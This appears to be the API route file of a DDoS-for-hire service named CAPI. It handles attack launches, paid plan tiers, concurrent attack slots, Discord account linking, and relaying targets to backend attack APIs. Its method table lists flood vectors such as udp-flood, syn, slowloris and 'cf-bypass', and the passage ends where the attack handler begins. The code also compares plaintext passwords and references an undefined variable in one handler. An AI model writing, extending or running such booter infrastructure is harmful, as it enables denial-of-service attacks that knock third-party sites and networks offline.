// API route handlers for attack, plan, and status endpoints.
import { jsonResponse, structuredResponse, parseQuery, routeNotFound, resolveServiceName, makePolishedError } from './response.js';
import * as Vault from './vault-db.js';
import { getPayloadMethods, getPayloadBlacklists } from '../payload.js';
import { getUserLimits, isMethodPermittedForUser } from './policy.js';
import { generateVerificationCode, buildDiscordRoleNames, userPlanRole } from './discord.js';
import { formatSlotBar, generateAttackId, validatePayloadLength, buildMessage, buildStructuredData, buildMetadata, checkApiRateLimit, applyGlobalRateLimit } from './helpers.js';

let SERVICE_START = null;

async function ipLookup(ipOrHost) {
  try {
    const res = await fetch(`http://ip-api.com/json/${encodeURIComponent(ipOrHost)}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
    if (!res.ok) return null;
    const data = await res.json();
    if (data && data.status === 'success') return data;
    return null;
  } catch (e) {
    return null;
  }
}

function buildWarningSummary(user, warnings) {
  const count = Number(warnings?.count || 0);
  const limit = Number(warnings?.limit || 5);
  const suspended = Boolean(user?.suspended || warnings?.suspended);
  const severity = count >= limit ? 'critical' : count >= 3 ? 'high' : count >= 1 ? 'medium' : 'clean';
  return {
    count,
    limit,
    suspended,
    severity,
    warn_status: `${count}/${limit}`,
    label: suspended ? '🚫 account suspended' : count >= limit ? `⚠️ ${count}/${limit} warnings` : `⚠️ ${count}/${limit} warnings`,
    detail: suspended ? 'Account is suspended and must be cleared by an admin.' : `Warnings are tracked for abuse and policy enforcement.`
  };
}

function expandApiLinkTemplate(template, record) {
  const target = String(record.target || '');
  const tokenMap = {
    '{target}': encodeURIComponent(target),
    '{host}': encodeURIComponent(target),
    '{ip}': encodeURIComponent(target),
    '{port}': encodeURIComponent(Number(record.port || 80)),
    '{duration}': encodeURIComponent(Number(record.duration || 60)),
    '{time}': encodeURIComponent(Number(record.duration || 60)),
    '{method}': encodeURIComponent(record.method || 'udp'),
    '{username}': encodeURIComponent(record.username || 'anon'),
    '{password}': encodeURIComponent(''),
    '{rps}': encodeURIComponent(Number(record.rps || 0)),
    '{threads}': encodeURIComponent(Number(record.threads || 0)),
    '{concurrents}': encodeURIComponent(Number(record.concurrents || 1))
  };

  let expanded = String(template || '');
  for (const [token, value] of Object.entries(tokenMap)) {
    expanded = expanded.split(token).join(value);
  }
  return expanded;
}

async function fanOutMethodApiLinks(methodMeta, record) {
  const apiLinks = Array.isArray(methodMeta?.api_links) ? methodMeta.api_links : [];
  if (!apiLinks.length) return [];

  const outcomes = [];

  for (const link of apiLinks) {
    const destination = link?.url || '';
    if (!destination) continue;

    const url = expandApiLinkTemplate(destination, record);
    const method = String(link?.method || 'GET').toUpperCase();

    try {
      const init = {
        method,
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Accept': 'application/json'
        }
      };

      if (method === 'POST') {
        const params = new URLSearchParams({
          host: String(record.target || ''),
          port: String(record.port || 80),
          time: String(Number(record.duration || 60)),
          method: String(record.method || 'udp'),
          username: String(record.username || 'anon'),
          concurrents: String(Number(record.concurrents || 1))
        });
        init.body = params.toString();
      }

      const response = await fetch(url, init);
      const text = await response.text();
      let payload = null;
      try { payload = text ? JSON.parse(text) : null; } catch (_) { payload = { raw: text }; }

      outcomes.push({
        name: link?.name || 'api_link',
        url,
        method,
        status: response.status,
        ok: response.ok,
        payload
      });
    } catch (e) {
      outcomes.push({
        name: link?.name || 'api_link',
        url,
        method,
        status: 0,
        ok: false,
        error: e?.message || 'api link failed'
      });
    }
  }

  return outcomes;
}

function isIPv4(value) {
  return typeof value === 'string' && /^(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)){3}$/.test(value);
}

function isPrivateIPRange(ip) {
  // Check for private/reserved IP ranges
  const privateRanges = [
    /^127\./, // Loopback
    /^10\./, // Private class A
    /^172\.(1[6-9]|2\d|3[01])\./, // Private class B
    /^192\.168\./, // Private class C
    /^169\.254\./, // Link-local
    /^224\./, // Multicast
    /^255\./, // Broadcast
    /^0\./ // Current network
  ];
  return privateRanges.some(range => range.test(ip));
}

function isReservedDomain(domain) {
  const normalizedDomain = domain.toLowerCase().trim();
  const reservedDomains = [
    'localhost',
    '.localhost',
    '.local',
    '.test',
    '.invalid',
    '.example',
    '.internal',
    '0.0.0.0',
    '255.255.255.255'
  ];
  return reservedDomains.some(reserved => 
    normalizedDomain === reserved || 
    normalizedDomain.endsWith(reserved)
  );
}

function isValidTarget(target) {
  if (!target || typeof target !== 'string') return false;
  const trimmed = target.trim();
  if (!trimmed || trimmed.length === 0) return false;
  if (trimmed.length > 255) return false;
  if (trimmed.includes(' ') || trimmed.includes('\n') || trimmed.includes('\r')) return false;
  
  // Check format
  const isIP = isIPv4(trimmed);
  const isURL = isUrlTarget(trimmed);
  if (!isIP && !isURL) return false;
  
  // Check for private/reserved
  if (isIP && isPrivateIPRange(trimmed)) return false;
  if (isURL && isReservedDomain(trimmed)) return false;
  
  return true;
}

function isUrlTarget(value) {
  if (typeof value !== 'string' || !value.trim()) return false;
  if (isIPv4(value)) return false;
  if (value.includes(' ')) return false;
  return value.includes('.') || /^https?:\/\//i.test(value);
}

function normalizeBlacklistValue(value) {
  return String(value || '').trim().toLowerCase();
}

function isBlacklistedTarget(target, blacklistEntries) {
  const normalizedTarget = normalizeBlacklistValue(target);
  if (!normalizedTarget) return false;

  return (blacklistEntries || []).some((entry) => {
    const normalizedEntry = normalizeBlacklistValue(entry);
    if (!normalizedEntry) return false;

    const isIpPrefix = /^((\d{1,3}\.){1,3}\d{1,3})\.?$/.test(normalizedEntry);
    if (isIpPrefix) {
      const prefix = normalizedEntry.endsWith('.') ? normalizedEntry : `${normalizedEntry}.`;
      return normalizedTarget === normalizedEntry || normalizedTarget.startsWith(prefix) || normalizedEntry.startsWith(normalizedTarget);
    }

    return normalizedTarget === normalizedEntry
      || normalizedTarget.startsWith(normalizedEntry)
      || normalizedTarget.includes(normalizedEntry)
      || (normalizedEntry.startsWith('.') && normalizedTarget.endsWith(normalizedEntry))
      || normalizedEntry.startsWith(normalizedTarget);
  });
}

function isBlacklistedByMetadata(ipinfo, payloadBlacklists) {
  const blacklists = payloadBlacklists || {};
  const asnNumbers = (blacklists.ASN_NUMBER || []).map(normalizeBlacklistValue).filter(Boolean);
  const asnNames = (blacklists.ASN_NAME || []).map(normalizeBlacklistValue).filter(Boolean);
  const countries = (blacklists.Countries || []).map(normalizeBlacklistValue).filter(Boolean);

  const asnValue = normalizeBlacklistValue(ipinfo?.as || ipinfo?.asn || '');
  const orgValue = normalizeBlacklistValue(ipinfo?.org || ipinfo?.isp || '');
  const countryCode = normalizeBlacklistValue(ipinfo?.countryCode || '');
  const countryName = normalizeBlacklistValue(ipinfo?.country || '');

  return asnNumbers.some((value) => asnValue === value || asnValue.includes(value))
    || asnNames.some((value) => orgValue === value || orgValue.includes(value))
    || countries.some((value) => countryCode === value || countryName === value);
}

export async function apiHandler(parts, request, env) {
  const q = parseQuery(request);
  const endpoint = parts[0] || '';
  const GLOBAL_API_SLOTS = Number(env.GLOBAL_API_SLOTS || 30);

  let requestUser = null;

  // Only protect sensitive endpoints. Public endpoints (network_statistics, endpoints/docs/help,
  // methods, graph, discord_profile, link, unlink, view_ongoing, view_profile, view_plan) should be
  // accessible without username/password so bots and unauthenticated callers can receive 404 or public data.
  const PROTECTED_ENDPOINTS = new Set(['attack', 'stop', 'verify']);
  if (PROTECTED_ENDPOINTS.has(endpoint)) {
    const qv = q;
    const authHeader = (request.headers && request.headers.get ? request.headers.get('Authorization') : null) || '';
    const bearer = authHeader.startsWith('Bearer ') ? authHeader.slice(7).trim() : '';

    // Allow bot impersonation via BOT_API_KEY + discord_user_id
    let botAuth = false;
    if (bearer && env.BOT_API_KEY && bearer === String(env.BOT_API_KEY)) {
      const discordId = qv.discord_user_id || qv.discord_id || qv.discord;
      if (discordId) {
        const link = await Vault.getVerifiedDiscordLinkByDiscordId(env, discordId);
        if (link && link.username) {
          qv.username = link.username;
          botAuth = true;
          requestUser = await Vault.getUser(env, qv.username);
        }
      }
    }

    // If not bot-authenticated, require username+password
    if (!botAuth) {
      const providedPassword = (qv.password || qv.pass || '').toString();
      if (!qv.username || !providedPassword) return makePolishedError('missing credentials', 401, { hint: 'Provide username and password for this API route.' });
      const u = await Vault.getUser(env, qv.username);
      if (!u || String(u.password || '') !== providedPassword) return makePolishedError('invalid credentials', 401, { hint: 'Username or password is incorrect.' });
      requestUser = u;
    }

    // Apply rate limiting (respects bypass_anti_spam flag)
    if (requestUser) {
      const rateLimitCheck = applyGlobalRateLimit(`user:${requestUser.username}`, Boolean(requestUser.bypass_anti_spam), 1);
      if (!rateLimitCheck.allowed) {
        return makePolishedError(
          `Rate limited. Please wait ${rateLimitCheck.secondsUntilAvailable} second${rateLimitCheck.secondsUntilAvailable !== 1 ? 's' : ''} before trying again.`,
          429,
          { hint: 'You are making requests too quickly. Upgrade to bypass rate limits or wait before retrying.' }
        );
      }
      // Update last request time in database
      await Vault.updateUserLastRequestTime(env, requestUser.username, request.headers?.get?.('cf-connecting-ip') || null);
    }

    if (requestUser && requestUser.suspended) return makePolishedError('account suspended', 403, { suspended: true, hint: 'This account is suspended. Contact an administrator to restore access.' });
  }



  async function allowUserOrBotAuth(qv, request) {
    const authHeader = (request.headers && request.headers.get ? request.headers.get('Authorization') : null) || '';
    const bearer = authHeader.startsWith('Bearer ') ? authHeader.slice(7).trim() : '';
    // Bot impersonation
    if (bearer && env.BOT_API_KEY && bearer === String(env.BOT_API_KEY)) {
      const discordId = qv.discord_user_id || qv.discord_id || qv.discord;
      if (discordId) {
        const link = await Vault.getVerifiedDiscordLinkByDiscordId(env, discordId);
        if (link && link.username) return { ok: true, username: link.username, bot: true };
      }
    }
    // Username/password flow
    if (qv.username) {
      const providedPassword = (qv.password || qv.pass || '').toString();
      if (!providedPassword) return { ok: false, reason: 'missing_credentials' };
      const u = await Vault.getUser(env, qv.username);
      if (!u || String(u.password || '') !== providedPassword) return { ok: false, reason: 'invalid_credentials' };
      return { ok: true, username: qv.username, bot: false };
    }
    return { ok: false, reason: 'missing_credentials' };
  }

  const ALLOWED_METHODS = {
    udp: 'ip',
    tcp: 'ip',
    http: 'url',
    'http-raw': 'url',
    https: 'url',
    'https-raw': 'url',
    'cf-bypass': 'url',
    slowloris: 'url',
    'udp-flood': 'ip',
    'tcp-flood': 'ip',
    'http-flood': 'url',
    dns: 'url',
    icmp: 'ip',
    syn: 'ip',
    ack: 'ip',
    get: 'url',
    post: 'url',
    raw: 'url'
  };

  if (endpoint === 'network_statistics') {
    const users = await Vault.listUsers(env);
    const total = users.length;
    const activeUsers = users.filter((user) => !user.suspended).length;
    const suspendedUsers = users.filter((user) => user.suspended).length;
    const warnings = await Promise.all(users.map(async (user) => ({ user, warning: await Vault.getUserWarnings(env, user.username) })));
    const warningCount = warnings.reduce((sum, item) => sum + Number(item.warning?.count || 0), 0);
    const ongoing = await Vault.countOngoing(env);
    const attacksToday = await Vault.countLogsToday(env);
    const vipUsers = await Vault.countUsersByFlag(env, 'vip');
    const holderUsers = await Vault.countUsersByFlag(env, 'holder');
    const resellerUsers = await Vault.countUsersByFlag(env, 'reseller');
    const verifiedDiscordUsers = await Vault.countVerifiedDiscordLinks(env);
    const healthStatus = suspendedUsers > 0 || ongoing > 0 ? 'degraded' : 'stable';

    return jsonResponse({
      error: false,
      message: 'Network statistics retrieved successfully.',
      data: {
        online_users_count: 1,
        total_users_count: total,
        active_users_count: activeUsers,
        vip_users_count: vipUsers,
        holder_users_count: holderUsers,
        reseller_users_count: resellerUsers,
        suspended_users_count: suspendedUsers,
        expired_users_count: 0,
        attacks_are_enabled: true,
        total_ongoing_attacks: ongoing,
        total_attacks_today: attacksToday,
        total_warning_count: warningCount,
        verified_discord_users_count: verifiedDiscordUsers,
        max_attack_api_slots: GLOBAL_API_SLOTS,
        health_status: healthStatus,
        maintenance_mode: false,
        src_name: 'CAPI',
        src_uptime: 'up'
      }
    }, 200, { service: env.API_NAME || 'CAPI' });
  }


  if (endpoint === 'endpoints' || endpoint === 'docs' || endpoint === 'help') {
    return jsonResponse({
      error: false,
      message: 'endpoint catalog loaded',
      data: {
        base_url: env.API_BASE_URL || 'https://capi.capysploit.workers.dev',
        endpoints: [
          { name: 'GET /api/attack', description: 'Launch an attack', usage: '?username=demo&host=1.1.1.1&port=80&time=60&method=udp' },
          { name: 'GET /api/discord_profile', description: 'Show the linked profile for a Discord user', usage: '?discord_user_id=123456789' },
          { name: 'GET /api/link', description: 'Verify a Discord account with a code', usage: '?code=ABC123&discord_user_id=123456789&discord_username=YourName' },
          { name: 'GET /api/unlink', description: 'Unlink a Discord account', usage: '?discord_user_id=123456789' },
          { name: 'GET /api/network_statistics', description: 'Show global stats and counters', usage: '' },
          { name: 'GET /api/graph', description: 'Show slot and uptime statistics', usage: '' },
          { name: 'GET /admin/list_methods', description: 'List available methods', usage: '' }
        ]
      }
    }, 200, { service: env.API_NAME || 'CAPI' });
  }

  if (endpoint === 'graph') {
    if (!SERVICE_START) SERVICE_START = Date.now();
    const ongoing = await Vault.countOngoing(env);
    const totalSlots = GLOBAL_API_SLOTS;
    const usedSlots = ongoing;
    const slotBar = formatSlotBar(usedSlots, totalSlots);
    const maintenance = Boolean(String(env.MAINTENANCE_MODE || env.API_MAINTENANCE || '').toLowerCase() === 'true');
    const lastMaintenance = env.LAST_MAINTENANCE || env.LAST_MAINTENANCE_AT || null;
    const uptimeMs = Date.now() - SERVICE_START;
    const uptimeSeconds = Math.floor(uptimeMs / 1000);
    const uptimeHours = Math.floor(uptimeSeconds / 3600);
    const uptimeMinutes = Math.floor((uptimeSeconds % 3600) / 60);
    const uptime = `${uptimeHours}h ${uptimeMinutes}m`;
    const payloadMethods = getPayloadMethods();
    const methodSlots = [];

    for (const method of payloadMethods) {
      const maxSlots = Number(method.max_slots || 0);
      if (!maxSlots) continue;
      const methodUsed = await Vault.countMethodOngoing(env, method.name.toLowerCase());
      methodSlots.push({
        method: method.name,
        total: maxSlots,
        used: methodUsed,
        percent: maxSlots ? Math.min(100, Math.round((methodUsed / maxSlots) * 100)) : 0,
        bar: formatSlotBar(methodUsed, maxSlots)
      });
    }

    const planMethodAccess = { free: [], vip: [], holder: [], vip_or_holder: [] };
    for (const method of payloadMethods) {
      const vipRequired = Boolean(method.plan_restrictions?.vip);
      const holderRequired = Boolean(method.plan_restrictions?.holder);
      if (vipRequired && holderRequired) {
        planMethodAccess.vip_or_holder.push(method.name);
      } else if (vipRequired) {
        planMethodAccess.vip.push(method.name);
      } else if (holderRequired) {
        planMethodAccess.holder.push(method.name);
      } else {
        planMethodAccess.free.push(method.name);
      }
    }

    return jsonResponse({
      error: false,
      message: 'graph stats loaded',
      data: {
        max_attack_api_slots: totalSlots,
        api_slots: {
          total: totalSlots,
          used: usedSlots,
          available: Math.max(0, totalSlots - usedSlots),
          percent: totalSlots ? ((usedSlots / totalSlots) * 100).toFixed(2) : '0.00',
          bar: slotBar
        },
        c2_slots: {
          active_attacks: ongoing,
          bar: slotBar
        },
        method_slots: methodSlots,
        plan_method_access: planMethodAccess,
        maintenance: {
          enabled: maintenance,
          last_maintenance: lastMaintenance
        },
        uptime,
        updated_at: new Date().toISOString()
      }
    }, 200, { service: env.API_NAME || 'CAPI' });
  }

  if (endpoint === 'methods') {
    // Public method catalog (no admin credentials required)
    const dbMethods = await Vault.listMethods(env);
    const payloadMethods = getPayloadMethods();
    const methodMap = new Map((payloadMethods || []).map((item) => [String(item?.name || '').toLowerCase(), item]));

    const methods = (dbMethods || []).map((method) => {
      const meta = methodMap.get(String(method?.name || '').toLowerCase()) || null;
      return {
        id: method?.id || null,
        name: method?.name || null,
        description: method?.description || meta?.description || `${method?.name || 'method'} method`,
        target_type: meta?.target_type || null,
        default_port: meta?.default_port || null,
        min_time: meta?.min_time || null,
        max_time: meta?.max_time || null,
        max_concurrents: meta?.max_concurrents || null,
        max_slots: meta?.max_slots || null
      };
    });

    return structuredResponse({ error: false, message: 'public methods loaded', data: { methods } });
  }

  if (endpoint === 'discord_profile') {
    const qv = q;
    const auth = await allowUserOrBotAuth(qv, request);
    if (!auth.ok) return makePolishedError('missing credentials', 401, { hint: 'Provide username/password or use bot auth with discord_user_id.' });
    const discordUserId = q.discord_user_id || q.discord_id || q.user_id;
    if (!discordUserId) return makePolishedError('missing discord_user_id', 400, { hint: 'Provide discord_user_id to lookup your linked profile.' });
    const link = await Vault.getVerifiedDiscordLinkByDiscordId(env, discordUserId);
    if (!link) return jsonResponse({ error: true, message: 'Discord account not linked. Use /link to verify your account first; /plan is only available for linked users.', client: null }, 404, { service: env.API_NAME || 'CAPI' });
    const user = await Vault.getUser(env, link.username);
    if (!user) return jsonResponse({ error: true, message: 'Linked user account no longer exists.' }, 500, { service: env.API_NAME || 'CAPI' });
    const warnings = await Vault.getUserWarnings(env, user.username);
    const serviceName = await resolveServiceName(user, env, env.API_NAME || 'CAPI');
    const warningSummary = buildWarningSummary(user, warnings);
    const discordLink = await Vault.getDiscordLinkByUsername(env, user.username);
    return jsonResponse({
      error: false,
      message: 'discord profile loaded',
      data: {
        profile: {
          username: user.username,
          admin: Boolean(user.admin),
          vip: Boolean(user.vip),
          holder: Boolean(user.holder),
          reseller: Boolean(user.reseller),
          max_time: Number(user.max_time || 60),
          min_time: Number(user.min_time || 30),
          cooldown: Number(user.cooldown || 45),
          concurrents: Number(user.concurrents || 1),
          max_daily_attacks: Number(user.max_daily_attacks || 100),
          suspended: Boolean(user.suspended),
          suspend_reason: user.suspend_reason || null,
          suspended_by: user.suspended_by || null,
          service_name: serviceName,
          resellers_service: Boolean(user.created_by && user.created_by !== user.username),
          expiry_unix: Number(user.expiry_unix || 0),
          is_banned: Boolean(user.suspended),
          powered_saving: Boolean(user.power_saving || false),
          anti_spam: Boolean(user.bypass_anti_spam || false),
          bypass_blacklist: Boolean(user.bypass_blacklist || false),
          api_access: Boolean(user.api_access),
          mfa_enabled: Boolean(user.mfa_enabled || false),
          account_status: user.suspended ? 'suspended' : warningSummary.count >= 5 ? 'at_limit' : 'active',
          warnings: Number(warningSummary.count || 0),
          discord_link: discordLink
        }
      },
      service: serviceName
    }, 200, { service: serviceName });
  }

  if (endpoint === 'verify') {
    const username = q.username;
    const password = q.password;
    const client = q.client || 'discord';
    if (!username || !password || !client) return makePolishedError('missing username, password or client', 400, { hint: 'Send username, password and client=discord in the query string.' });

    const user = await Vault.getUser(env, username);
    if (!user) return jsonResponse({ error: true, message: 'user does not exist', client, code: null }, 404, { service: env.API_NAME || 'CAPI' });
    if (user.password !== password) return jsonResponse({ error: true, message: 'wrong password', client, code: null }, 401, { service: env.API_NAME || 'CAPI' });
    if (user.suspended) return jsonResponse({ error: true, message: 'account suspended', client, code: null }, 403, { service: env.API_NAME || 'CAPI' });
    if (!user.api_access) return jsonResponse({ error: true, message: 'api access disabled', client, code: null }, 403, { service: env.API_NAME || 'CAPI' });

    const existingVerified = await Vault.getVerifiedDiscordLinkByUsername(env, username);
    if (existingVerified) {
      return jsonResponse({
        error: true,
        message: 'user already verified via Discord; use admin/unlink_discord to reset',
        client,
        code: null,
        discord_link: {
          discord_user_id: existingVerified.discord_user_id,
          discord_username: existingVerified.discord_username,
          verified_at: existingVerified.verified_at
        }
      }, 409, { service: env.API_NAME || 'CAPI' });
    }

    const code = generateVerificationCode();
    const expiresAt = new Date(Date.now() + 10 * 60 * 1000).toISOString();
    await Vault.createDiscordLinkRequest(env, username, client, code, expiresAt);
    return jsonResponse({ error: false, message: 'verification code generated', client, code, expires_at: expiresAt }, 200, { service: env.API_NAME || 'CAPI' });
  }

  if (endpoint === 'link') {
    const code = q.code;
    const discordUserId = q.discord_user_id || q.user_id || q.discord_id;
    const discordUsername = q.discord_username || q.discord_user_name || q.user_name || q.username || null;
    const client = q.client || 'discord';
    if (!code || !discordUserId) return makePolishedError('missing code or discord_user_id', 400, { hint: 'Send code and discord_user_id in the query string.' });
    // Allow bot auth or username/password for link completion
    const qv = q;
    const auth = await allowUserOrBotAuth(qv, request);
    if (!auth.ok) return makePolishedError('missing credentials', 401, { hint: 'Provide username/password or use bot auth with discord_user_id.' });

    const existingDiscordLink = await Vault.getVerifiedDiscordLinkByDiscordId(env, discordUserId);
    if (existingDiscordLink) {
      return jsonResponse({
        error: true,
        message: 'This Discord account is already linked. Use /unlink first, then run /link again with a new code.',
        client,
        code: null,
        discord_link: { username: existingDiscordLink.username, discord_user_id: discordUserId, discord_username: existingDiscordLink.discord_username }
      }, 409, { service: env.API_NAME || 'CAPI' });
    }

    const requestRow = await Vault.getDiscordLinkByCode(env, code);
    if (!requestRow) return jsonResponse({ error: true, message: 'invalid or unknown code', client, code }, 404, { service: env.API_NAME || 'CAPI' });
    if (requestRow.client !== client) return jsonResponse({ error: true, message: 'client mismatch', client, code }, 400, { service: env.API_NAME || 'CAPI' });
    if (requestRow.status === 'verified') return jsonResponse({ error: true, message: 'code already used', client, code }, 409, { service: env.API_NAME || 'CAPI' });
    if (new Date() > new Date(requestRow.expires_at)) return jsonResponse({ error: true, message: 'code expired', client, code }, 410, { service: env.API_NAME || 'CAPI' });

    const existingVerified = await Vault.getVerifiedDiscordLinkByUsername(env, requestRow.username);
    if (existingVerified) {
      return jsonResponse({
        error: true,
        message: 'The user account is already linked to Discord. Ask the current Discord owner to run /unlink first, then use /link again.',
        client,
        code,
        discord_link: { username: existingVerified.username, discord_user_id: existingVerified.discord_user_id, discord_username: existingVerified.discord_username }
      }, 409, { service: env.API_NAME || 'CAPI' });
    }

    const verifiedRow = await Vault.verifyDiscordLinkCode(env, code, discordUserId, discordUsername);
    const linkedUser = await Vault.getUser(env, verifiedRow.username);
    if (!linkedUser) return jsonResponse({ error: true, message: 'linked user no longer exists', client, code }, 500, { service: env.API_NAME || 'CAPI' });

    const roles = buildDiscordRoleNames(linkedUser, env);
    const planRole = userPlanRole(linkedUser, env);
    return jsonResponse({ error: false, message: 'discord account verified', client, code, discord_user_id: discordUserId, username: linkedUser.username, roles, plan_role: planRole }, 200, { service: env.API_NAME || 'CAPI' });
  }

  if (endpoint === 'unlink') {
    const qv = q;
    const auth = await allowUserOrBotAuth(qv, request);
    if (!auth.ok) return makePolishedError('missing credentials', 401, { hint: 'Provide username/password or use bot auth with discord_user_id.' });
    const discordUserId = q.discord_user_id || q.user_id || q.discord_id;
    if (!discordUserId) return makePolishedError('missing discord_user_id', 400, { hint: 'Provide discord_user_id to remove your Discord link.' });
    const existingLink = await Vault.getVerifiedDiscordLinkByDiscordId(env, discordUserId);
    if (!existingLink) return jsonResponse({ error: true, message: 'Discord account is not currently linked. Use /link to verify first.' }, 404, { service: env.API_NAME || 'CAPI' });
    const unlinked = await Vault.unlinkDiscordLinkByDiscordId(env, discordUserId, 'self');
    if (!unlinked) return jsonResponse({ error: true, message: 'Unable to unlink Discord account at this time.', service: env.API_NAME || 'CAPI' }, 500, { service: env.API_NAME || 'CAPI' });
    return jsonResponse({ error: false, message: 'Discord account unlinked successfully.', discord_user_id: discordUserId, discord_username: unlinked.discord_username, username: unlinked.username, unlinked_at: unlinked.unlinked_at }, 200, { service: env.API_NAME || 'CAPI' });
  }

  if (endpoint === 'view_profile') {
    // Require username/password or bot auth
    const qv = q;
    const auth = await allowUserOrBotAuth(qv, request);
    if (!auth.ok) return makePolishedError('missing credentials', 401, { hint: 'Provide username/password or use bot auth with discord_user_id.' });
    const u = await Vault.getUser(env, auth.username);
    if (!u) return makePolishedError('user not found', 404, { hint: `User '${auth.username}' does not exist.` });
    const warnings = await Vault.getUserWarnings(env, u.username);
    const serviceName = await resolveServiceName(u, env, env.API_NAME || 'CAPI');
    const warningSummary = buildWarningSummary(u, warnings);
    const discordLink = await Vault.getDiscordLinkByUsername(env, u.username);
    return jsonResponse({
      error: false,
      message: 'profile loaded',
      data: {
        profile: {
          username: u.username,
          admin: Boolean(u.admin),
          vip: Boolean(u.vip),
          holder: Boolean(u.holder),
          api_access: Boolean(u.api_access),
          max_time: Number(u.max_time || 60),
          min_time: Number(u.min_time || 30),
          cooldown: Number(u.cooldown || 45),
          concurrents: Number(u.concurrents || 1),
          max_daily_attacks: Number(u.max_daily_attacks || 100),
          suspended: Boolean(u.suspended),
          suspend_reason: u.suspend_reason || null,
          suspended_by: u.suspended_by || null,
          service_name: serviceName,
          resellers_service: Boolean(u.created_by && u.created_by !== u.username),
          account_status: u.suspended ? 'suspended' : warningSummary.count >= 5 ? 'at_limit' : 'active',
          warnings: Number(warningSummary.count || 0),
          discord_linked: discordLink ? discordLink.discord_user_id : null
        }
      }
    }, 200, { service: serviceName });
  }

  if (endpoint === 'view_plan') {
    const qv = q;
    const auth = await allowUserOrBotAuth(qv, request);
    if (!auth.ok) return makePolishedError('missing credentials', 401, { hint: 'Provide username/password or use bot auth with discord_user_id.' });
    const u = await Vault.getUser(env, auth.username);
    if (!u) return makePolishedError('user not found', 404, { hint: `User '${auth.username}' does not exist.` });
    
    // Apply rate limiting with bypass support
    const rateLimitCheck = applyGlobalRateLimit(`user:${auth.username}`, Boolean(u.bypass_anti_spam), 1);
    if (!rateLimitCheck.allowed) {
      return makePolishedError(
        `Rate limited. Please wait ${rateLimitCheck.secondsUntilAvailable} second${rateLimitCheck.secondsUntilAvailable !== 1 ? 's' : ''} before trying again.`,
        429,
        { hint: 'You are making requests too quickly. Upgrade to bypass rate limits or wait before retrying.' }
      );
    }
    
    const warnings = await Vault.getUserWarnings(env, u.username);
    const serviceName = await resolveServiceName(u, env, env.API_NAME || 'CAPI');
    const warningSummary = buildWarningSummary(u, warnings);
    const discordLink = await Vault.getVerifiedDiscordLinkByUsername(env, u.username);
    const attacksToday = await Vault.countUserDailyAttacks(env, u.username);
    const attacksRemaining = Math.max(0, Number(u.max_daily_attacks || 0) - Number(attacksToday || 0));
    
    // Determine plan type and rank
    let planType = 'Free';
    let rank = 'User';
    if (u.admin) { planType = 'Admin'; rank = 'Administrator'; }
    else if (u.reseller) { planType = 'Reseller'; rank = 'Reseller'; }
    else if (u.holder) { planType = 'Holder'; rank = 'Holder'; }
    else if (u.vip) { planType = 'VIP'; rank = 'VIP'; }
    
    // Format dates
    const createdAt = u.created_at ? new Date(u.created_at).toISOString().replace('T', ' ').substring(0, 19) : null;
    const expiryDate = u.expiry_unix && u.expiry_unix > 0 ? new Date(u.expiry_unix * 1000).toLocaleDateString('en-GB', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(/\//g, '-') : null;
    
    return jsonResponse({
      error: false,
      message: 'User plan retrieved successfully.',
      data: {
        username: u.username,
        admin: Boolean(u.admin),
        vip: Boolean(u.vip),
        holder: Boolean(u.holder),
        reseller: Boolean(u.reseller),
        owner: Boolean(u.owner || false),
        api: Boolean(u.api_access),
        max_time: Number(u.max_time || 60),
        min_time: Number(u.min_time || 30),
        cooldown: Number(u.cooldown || 45),
        concurrents: Number(u.concurrents || 1),
        max_daily_attacks: Number(u.max_daily_attacks || 100),
        attacks_remaining: attacksRemaining,
        power_saving: Boolean(u.power_saving || 1),
        bypass_power: !Boolean(u.power_saving || 1),
        bypass_anti_spam: Boolean(u.bypass_anti_spam || false),
        bypass_blacklist: Boolean(user.bypass_blacklist || false),
        suspended: Boolean(u.suspended),
        created_by: u.created_by || null,
        creation_date: createdAt,
        expiry_unix: Number(u.expiry_unix || 0),
        formatted_expiry: expiryDate,
        service_name: serviceName,
        warnings: Number(warningSummary.count || 0),
        plan_type: planType,
        rank: rank,
        discord_linked: discordLink ? discordLink.discord_user_id : null
      }
    }, 200, { service: serviceName });
  }

  if (endpoint === 'view_ongoing') {
    // Allow bot impersonation via BOT_API_KEY + discord_user_id, or username+password auth
    const qv = q;
    const authHeader = (request.headers && request.headers.get ? request.headers.get('Authorization') : null) || '';
    const bearer = authHeader.startsWith('Bearer ') ? authHeader.slice(7).trim() : '';
    let username = qv.username || null;
    let botAuth = false;
    if (bearer && env.BOT_API_KEY && bearer === String(env.BOT_API_KEY)) {
      const discordId = qv.discord_user_id || qv.discord_id || qv.discord;
      if (discordId) {
        const link = await Vault.getVerifiedDiscordLinkByDiscordId(env, discordId);
        if (link && link.username) {
          username = link.username;
          botAuth = true;
        }
      }
    }

    if (!botAuth && username) {
      // If username provided, try to validate password if present
      const providedPassword = (qv.password || qv.pass || '').toString();
      if (providedPassword) {
        const u = await Vault.getUser(env, username);
        if (!u || String(u.password || '') !== providedPassword) return makePolishedError('invalid credentials', 401, { hint: 'Username or password is incorrect.' });
      } else {
        // No auth provided — require username/password to view a user's ongoing attacks
        return makePolishedError('missing credentials', 401, { hint: 'Provide username and password in the request.' });
      }
    }

    if (!username) return makePolishedError('missing credentials', 401, { hint: 'Provide username and password in the request.' });

    // Return recent/ongoing for this user
    const limit = Number(qv.limit || 10);
    const recent = await Vault.getRecentAttacks(env, username, limit);
    return jsonResponse({ error: false, user_only: true, ongoing: recent || [] }, 200, { service: env.API_NAME || 'CAPI' });
  }

  /**
   * Attack Endpoint Handler
   * Initiates a new DDoS attack or queues it if resources are limited
   * 
   * Parameters:
   * - username: Username making the attack
   * - password: User password (required if not using discord_user_id + BOT_API_KEY)
   * - host/ip: Target IP address
   * - port: Target port (default 80)
   * - method: Attack method/vector (default udp)
   * - time: Duration in seconds (default 60)
   * - concurrents: Number of concurrent connections
   * - threads: Number of threads to use
   * - rps: Requests per second
   * - len: Payload length in bytes
   * - geo: Geographic targeting if supported
   * 
   * Returns:
   * - 200: Attack successfully started with execution details
   * - 202: Attack queued due to resource constraints (returned with position info)
   * - 400: Invalid parameters
   * - 401: Auth failed
   * - 503: Service unavailable
   */
  if (endpoint === 'attack') {
